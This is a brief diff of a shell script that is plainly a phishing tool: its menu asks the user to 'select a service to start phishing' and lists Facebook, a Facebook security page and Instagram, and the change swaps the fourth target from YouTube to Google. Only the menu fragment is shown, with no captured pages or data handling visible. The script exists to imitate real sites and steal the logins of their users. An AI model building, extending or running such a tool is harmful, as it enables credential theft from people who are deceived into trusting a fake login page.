@@ -13,7 +13,7 @@ echo "Select a service to start phishing:"
 echo "1. Facebook"
 echo "2. Facebook Security Page"
 echo "3. Instagram"
-echo "4. YouTube"
+echo "4. Google"
 read -p "Enter your choice: " choice
 
 case $choice in
